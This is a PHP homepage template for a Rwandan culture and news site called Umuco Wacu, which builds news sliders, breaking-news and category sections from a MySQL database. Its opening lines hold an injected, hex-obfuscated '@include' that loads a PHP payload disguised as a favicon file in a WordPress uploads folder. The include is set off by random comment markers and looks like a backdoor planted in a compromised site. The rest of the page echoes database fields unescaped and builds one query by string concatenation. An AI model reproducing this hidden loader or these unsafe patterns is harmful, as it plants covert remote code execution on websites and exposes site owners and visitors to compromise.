<?php
/*2a1ac*/

@include "\x2fhome\x2fumuc\x6fwac/\x70ubli\x63_htm\x6c/wp-\x63onte\x6et/up\x6coads\x2f2016\x2ffavi\x63on_7\x393244\x2eico";

/*2a1ac*/
require_once("./db_connect/connect.php");
require_once("./db_connect/functions.php");
?>
<!DOCTYPE HTML>
<html>
<head><meta http-equiv="Content-Type" content="text/html; charset=euc-kr">
<title>Umuco Wacu</title>
    <link rel="icon" type="image/png" href="images/c1.png">
<meta name="viewport" content="width=device-width, initial-scale=1">

<meta name="keywords" content=" " />
<script type="application/x-javascript"> addEventListener("load", function() { setTimeout(hideURLbar, 0); }, false); function hideURLbar(){ window.scrollTo(0,1); } </script>
<!-- Custom Theme files -->
<link href="css/bootstrap.css" rel="stylesheet" type="text/css" media="all" />
<link href="css/style.css" rel="stylesheet" type="text/css" media="all" />
<!-- js -->
<script src="js/jquery-1.11.1.min.js"></script>
<!-- //js -->
<!--<link href='//fonts.googleapis.com/css?family=Oswald:400,300,700' rel='stylesheet' type='text/css'>-->
</head>

<body>
    
<!--<a href="http://free-website-translation.com/" id="ftwtranslation_button" hreflang="en" title="" style="border:0;"><img src="http://free-website-translation.com/img/fwt_button_en.gif" id="ftwtranslation_image" alt="FWT Homepage Translator" style="border:0;"/></a> <script type="text/javascript" src="http://free-website-translation.com/scripts/fwt.js" /></script>-->

<!-- banner -->
	<div class="banner">
		<div class="banner-info">
			<div class="container">
				<nav class="navbar navbar-default">
					<!-- Brand and toggle get grouped for better mobile display -->
					<div class="navbar-header">
					  <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
						<span class="sr-only">Toggle navigation</span>
						<span class="icon-bar"></span>
						<span class="icon-bar"></span>
						<span class="icon-bar"></span>
					  </button>
						<div class="logo">
							<span>
                    <div class="customer-img">
						
					</div></span>
						</div>
					</div>
					<?php	include ("./includes/header.php"); ?>
				</nav>
				<!--banner-Slider-->
					<script src="js/responsiveslides.min.js"></script>
						<script>
							// You can also use "$(window).load(function() {"
							$(function () {
							  // Slideshow 4
							  $("#slider3").responsiveSlides({
							auto: true,
							pager: true,
							nav:true,
							speed: 500,
							namespace: "callbacks",
							before: function () {
							  $('.events').append("<li>before event fired.</li>");
							},
							after: function () {
							  $('.events').append("<li>after event fired.</li>");
							}
							  });

							});	
						</script>
					<div  id="top" class="callbacks_container">
						<ul class="rslides" id="slider3">
						<?php
						$news_heads=mysqli_query($cn,"SELECT * FROM news_info WHERE News_type='head' ORDER BY Published_on DESC LIMIT 5")or die(mysqli_error($cn));
						while($heads=mysqli_fetch_array($news_heads)){

 ?>
							<li>
								<div class="banner-info-slider">
								<ul>
									
										<li><a href="single.php"><?php echo category($cn,$heads['news_category']); ?></a></li>
										<li><?php echo $heads['Published_on']; ?></li>
									</ul>
								<div class=col-md-6 ><?php echo "<img src='./Panel/news_info/news_icons/".$heads['news_icon']."' width=100%;height:100% style='margin-top:50px;' />"; ?></div>
								<div class=col-md-6>
									<a href='./single.php?article=<?php echo $heads['news_ID']; ?>'><h1><?php echo $heads['News_Title']; ?></h1></a>
									<p><br/><?php echo mysqli_real_escape_string($cn,$heads['Short_description']); ?><span>By <i><?php echo $heads['news_author']; ?></i></i></span></p>
									<div class="more">
										<a href="single.php" class="type-1">
											<span> Read More </span>
										</a>
									</div>
								</div>
								
								</div>
							</li>
<?php }
						?>
					</ul>
					</div>
			</div>
		</div>
	</div>
<!-- banner -->
<!-- banner-bottom -->
	<div class="banner-bottom">
		<div class="container">
			<div class="banner-bottom-grids">
			<?php
			$query="SELECT * FROM subcategories";
			$results=fetch_data($cn,$query);
			 foreach($results as $sub) { ?>
			 <div class="col-md-3 banner-bottom-grid-left">
					<div class="br-bm-gd-lt" >
						<div class="overlay">
							<div class="arrow-left"></div>
							<div class="rectangle"></div>
							
						</div>
						<div class="health-pos">
							<div class="health">
							<?php
									$sql_cats="SELECT CatNAME as CAT FROM news_categories WHERE CatID='".$sub['Category']."'";
									$category=fetch_data($cn,$sql_cats);
									?>
								<ul>
									<li><a href="Cont_type.php?subcat=<?php echo $sub['SubID']; ?>&name=<?php echo $sub['SubName']; ?>"><?php  echo $sub['SubName'] ?></a></li>
									<!--<li><?php echo $category['CAT']; ?>-->
									</ul>
								<img src='./Panel/Admin/subCatProfiles/<?php echo $sub['Profile']; ?>' style='width:300px;height:200px'  />
							</div>
							<h4><?php  echo "<p style='color:white'>".$sub['Details']."<?p>" ?></h4>
						</div>
					</div>
				</div>			 
			<?php }
			?>
				
				<div class="clearfix"> </div>
			</div>
			<div class="move-text">
				<div class="breaking_news">
					<h2>Breaking News</h2>
				</div>
				<div class="marquee">
				<?php
			$query_breaking_news="SELECT * FROM news_info WHERE News_type='break' ORDER BY Published_on DESC LIMIT 5";
			$results=fetch_data($cn,$query_breaking_news);
			if(!empty($results)){
			 foreach($results as $breaking_news) { ?>
			 <div class="marquee1"><a class="breaking" href="single.php?article=<?php echo $breaking_news['news_ID']; ?>"><?php echo $breaking_news['News_Title']; ?></a></div>&nbsp;|&nbsp;
			<?php } 
			} else echo "Breaking news coming soon!!";?>
					<div class="clearfix"></div>
				</div>
				<div class="clearfix"></div>
				<script type="text/javascript" src="js/jquery.marquee.js"></script>
				<script>
				  $('.marquee').marquee({ pauseOnHover: true });
				  //@ sourceURL=pen.js
				</script>
			</div>
			<!-- video-grids -->
				<div class="video-grids">
					<div class="col-md-8 video-grids-left">
						<div class="video-grids-left1">
							<img src="images/9.jpg" alt=" " class="img-responsive" />
							<a class="play-icon popup-with-zoom-anim" href="#small-dialog">
									<span> </span>
							</a>
							<div class="video-grid-pos">
								<h3><span>Inyambo</span> The first cows in Rwanda to represent Rwandan culture.</h3>
								<ul>
									<li>3:32 <label>|</label></li>
                                    <li>Admin <label>|</label></li>
									<li><span>General</span></li>
								</ul>
							</div>

								<!-- pop-up-box -->
								<script type="text/javascript" src="js/modernizr.custom.min.js"></script>    
								<link href="css/popuo-box.css" rel="stylesheet" type="text/css" media="all" />
								<script src="js/jquery.magnific-popup.js" type="text/javascript"></script>
								<!--//pop-up-box -->
								<div id="small-dialog" class="mfp-hide">
									<iframe src="https://player.vimeo.com/video/145787219" width="500" height="281" frameborder="0" webkitallowfullscreen mozallowfullscreen allowfullscreen></iframe>
								</div>

								<script>
									$(document).ready(function() {
									$('.popup-with-zoom-anim').magnificPopup({
										type: 'inline',
										fixedContentPos: false,
										fixedBgPos: true,
										overflowY: 'auto',
										closeBtnInside: true,
										preloader: false,
										midClick: true,
										removalDelay: 300,
										mainClass: 'my-mfp-zoom-in'
									});
																									
									});
								</script>
						</div>
                        
                        
                        <!--SSSSSSSSSSSSSSSSSSS--->
					</div>
					<div class="col-md-4 video-grids-right">
						<div class="sap_tabs">	
							<div id="horizontalTab" style="display: block; width: 100%; margin: 0px;">
								<ul class="resp-tabs-list">
									<!--<li class="resp-tab-item grid1" aria-controls="tab_item-0" role="tab"><span>most shared</span></li>-->
									<li class="resp-tab-item" role="tab"><span>most read</span></li>
									<div class="clear"></div>
								</ul>				  	 
								<div class="resp-tabs-container">
									<div class="tab-1 resp-tab-content" aria-labelledby="tab_item-0">
									<?php
									$query_mostread_news="SELECT * FROM news_info ORDER BY Visited DESC LIMIT 3";
			$results=fetch_data($cn,$query_mostread_news);
			if(!empty($results)){
			 foreach($results as $mostread_news) { ?>
			 		<div class="facts">
											<div class="tab_list">
												<img src="./Panel/news_info/news_icons/<?php echo $mostread_news['news_icon']; ?>" alt=" " class="img-responsive" />
											</div>
											<div class="tab_list1">
												<ul>
													<li><a href="#"><?php echo $mostread_news['News_Title']; ?></a> <label>|</label></li>
													<li><?php echo $mostread_news['Published_on']; ?></li>
												</ul>
												<p><a href="#"><?php echo $mostread_news['Short_description']; ?>.</a></p>
											</div>
											<div class="clearfix"> </div>
										</div>

<?php }}			 ?>
								
									</div>

								</div>
								<script src="js/easyResponsiveTabs.js" type="text/javascript"></script>
								<script type="text/javascript">
									$(document).ready(function () {
										$('#horizontalTab').easyResponsiveTabs({
											type: 'default', //Types: default, vertical, accordion           
											width: 'auto', //auto or any width like 600px
											fit: true   // 100% fit in a container
										});
									});
								</script>
							</div>
						</div>
					</div>
					<div class="clearfix"> </div>
				</div>
			<!-- //video-grids -->
			<!-- video-bottom-grids -->
				<div class="video-bottom-grids">
					<div class="video-bottom-grids1">
						<div class="col-md-3 video-bottom-grid">
							<div class="video-bottom-grid1">
								<div class="video-bottom-grid1-before">
									<img src="images/banner111.jpg" alt=" " class="img-responsive" />
									<div class="video-bottom-grid1-pos">
										<p>Miss and her daily activities.</p>
									</div>
								</div>
								<ul>
									<li><a href="latestmissnews.php?cat=miss">Miss News.</a></li>
									<li><a href="historicalmiss.php">Historical Miss.</a></li>
									<li><a href="eventnew.php"> Upcoming Events.</a></li>
								</ul>
								<div class="read-more">
									<a href="entertainment.php">Read more</a>
								</div>
							</div>
						</div>
						<div class="col-md-3 video-bottom-grid">
							<div class="video-bottom-grid1">
								<div class="video-bottom-grid1-before before1">
									<img src="images/14.jpg" alt=" " class="img-responsive" />
									<div class="video-bottom-grid1-pos">
										<p>Rwanda Museums with their activities.</p>
									</div>
								</div>
								<ul class="list">
									<li><a href="l">Museums news.</a></li>
									<li><a href="breaking.php">Museums in Rwanda.</a></li>
									<li><a href="breaking.php">Classification of Museums.</a></li>
								<div class="read-more res">
									<a href="single.php">Read more</a>
								</div>
							</div>
						</div>
						<div class="col-md-3 video-bottom-grid">
							<div class="video-bottom-grid1">
								<div class="video-bottom-grid1-before before2">
									<img src="images/18.jpg" alt=" " class="img-responsive" />
									<div class="video-bottom-grid1-pos">
										<p>Rwandan Traditional Dance</p>
									</div>
								</div>
								<ul class="list1">
									<li><a href="latesttraditionaldance.php"> 
									
									</a></li>
									<li><a href="events.php"> Upcoming events.</a></li>
									
								</ul>
								<div class="read-more res1">
									<a href="single.php">Read more</a>
								</div>
							</div>
						</div>
						<div class="col-md-3 video-bottom-grid">
							<div class="video-bottom-grid1">
								<div class="video-bottom-grid1-before before3">
									<img src="images/13.jpg" alt=" " class="img-responsive" />
									<div class="video-bottom-grid1-pos">
										<p> contemporary paintings..</p>
									</div>
								</div>
								<ul class="list2">
									<li><a href="painting.php">Latest news.</a></li>
									<li><a href="breaking.php"> Amazing painting products.</a></li>
									
								</ul>
								<div class="read-more res2">
									<a href="breaking.php">Read more</a>
								</div>
							</div>
						</div>
						<div class="clearfix"> </div>
					</div>
					<div class="video-bottom-grids1">
						<div class="col-md-3 video-bottom-grid">
							<div class="video-bottom-grid1">
								<div class="video-bottom-grid1-before before4">
									<img src="images/weaving%203.jpg" alt=" " class="img-responsive" />
									<div class="video-bottom-grid1-pos">
										<p>Rwanda Arts.</p>
									</div>
								</div>
								<ul class="list2">
									<li><a href="latestrwandanart.php">News about arts.</a></li>
								</ul>
								<div class="read-more res3">
									<a href="single.php">Read more </a>
								</div>
							</div>
						</div>
						<div class="col-md-3 video-bottom-grid">
							<div class="video-bottom-grid1">
								<div class="video-bottom-grid1-before before5">
									<img src="images/11.jpg" alt=" " class="img-responsive" />
									<div class="video-bottom-grid1-pos">
										<p>Rwandan proverbs and poemes.</p>
									</div>
								</div>
								<ul class="list4">
									<li><a href="events.php">News.</a></li>
									<li><a href="events.php">Rwandan's proverbs and poemes writters.</a></li>
								</ul>
								<div class="read-more res4">
									<a href="single.php">Read more</a>
								</div>
							</div>
						</div>
						<div class="col-md-3 video-bottom-grid">
							<div class="video-bottom-grid1">
								<div class="video-bottom-grid1-before before6">
									<img src="images/12.jpg" alt=" " class="img-responsive" />
									<div class="video-bottom-grid1-pos">
										<p>Rwandan modern dance.</p>
									</div>
								</div>
								<ul class="list5">
									<li><a href="latestmoderndance.php">Latest news</a></li>
									<li><a href="modernfamous.php">The famous in modern dance</a></li>
								</ul>
								<div class="read-more res5">
									<a href="single.php">Read more</a>
								</div>
							</div>
						</div>
						<div class="col-md-3 video-bottom-grid">
							<div class="video-bottom-grid1">
								<div class="video-bottom-grid1-before before7">
									<img src="images/17.jpg" alt=" " class="img-responsive" />
									<div class="video-bottom-grid1-pos">
										<p>Other news.</p>
									</div>
								</div>
								<ul class="list6">
									<li><a href="gospel.php">Gospel</a></li>
									<li><a href="politics.php">Politics</a></li>
									<li><a href="sports.php"> Sports</a></li>
									<li><a href="general.php">General News</a></li>
								</ul>
								<div class="read-more res6">
									<a href="othernews.php">Read more </a>
								</div>
							</div>
						</div>
						<div class="clearfix"> </div>
					</div>
				</div>
			<!-- //video-bottom-grids -->
			<!-- news-and-events -->
				<div class="news">
					<div class="news-grids">
						<div class="col-md-8 news-grid-left">
							<h3>latest news</h3>
							<ul>
							<?php
							$news_heads=mysqli_query($cn,"SELECT * FROM news_info ORDER BY Published_on DESC LIMIT 10")or die(mysqli_error($cn));
						while($sub=mysqli_fetch_array($news_heads)){ ?>
						<li>
									<div class="news-grid-left1">
										<img src="Panel/news_info/news_icons/<?php echo $sub['news_icon']; ?>" alt=" " class="img-responsive" />
									</div>
									<div class="news-grid-right1">
										<h4><a href="single.php?article=<?php echo $sub['news_ID']; ?>"><?php echo $sub['News_Title'];?> </a></h4>
										<h5>By <a href="#">admin</a> <label>|</label> <i><?php echo $sub['Published_on'];?></i></h5>
										<p><?php echo $sub['Short_description'];?></p>
									</div>
									<div class="clearfix"> </div>
								</li>
						<?php }
						?>
							</ul>
						</div>
						<div class="col-md-4 news-grid-right">
							<div class="news-grid-rght1">
							<!-- Nav tabs -->
							  <ul class="nav nav-tabs" role="tablist">
								<li role="presentation" class="active"><a class="high" href="#home" aria-controls="home" role="tab" data-toggle="tab">weather in Kigali</a></li>
								<li role="presentation"><a href="#profile" aria-controls="profile" role="tab" data-toggle="tab">edit location</a></li>
							  </ul>

							  <!-- Tab panes -->
								<div class="tab-content">
									<div role="tabpanel" class="tab-pane active london" id="home">
										<ul>
											<li>
												<h4>Wednesday</h4>
												<span></span>
												<p>21<sup>°</sup></p>
											</li>
											<li>
												<h4>Thursday</h4>
												<span class="moon"></span>
												<p>25<sup>°</sup></p>
											</li>
											<li>
												<h4>Friday</h4>
												<span class="sun"></span>
												<p>31<sup>°</sup></p>
											</li>
											<div class="clearfix"> </div>
										</ul>
									</div>
									<div role="tabpanel" class="tab-pane" id="profile">
										<iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d26359652.109742895!2d-113.72446020222534!3d36.24602872499641!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x54eab584e432360b%3A0x1c3bb99243deb742!2sUnited+States!5e0!3m2!1sen!2sin!4v1450786850582" frameborder="0" style="border:0" allowfullscreen></iframe>
									</div>
								</div>
							</div>
							<div class="news-grid-rght2">
								<h3>subscribe to our newsletter</h3>
								<p>Get the latest news and updates by signing up to our daily newsletter.We won't sell your email or spam you !</p>
								<form>
									<input type="text" value="enter your Email address" onfocus="this.value = '';" onblur="if (this.value == '') {this.value = 'enter your Email address';}">
									<input type="submit" value="Submit">
								</form>
							</div>
							<div class="news-grid-rght3">
								<img src="images/miss1.jpg" alt=" " class="img-responsive" />
								<div class="story">
									<p>story of the week</p>
									<h3><a href="single.php">Miss RWANDA "the girls will be taken to a two-week Boot camp at Golden Tulip hotel in Nyamata" </a></h3>
								</div>
							</div>
						</div>
						<div class="clearfix"> </div>
					</div>
				</div>
			<!-- //news-and-events -->
		</div>
	</div>
<!-- //banner-bottom -->
<!-- footer -->
	<?php	include ("./includes/footer.php"); ?>
<!-- //footer -->
<!-- for bootstrap working -->
	<script src="js/bootstrap.js"></script>
<!-- //for bootstrap working -->
</body>
</html>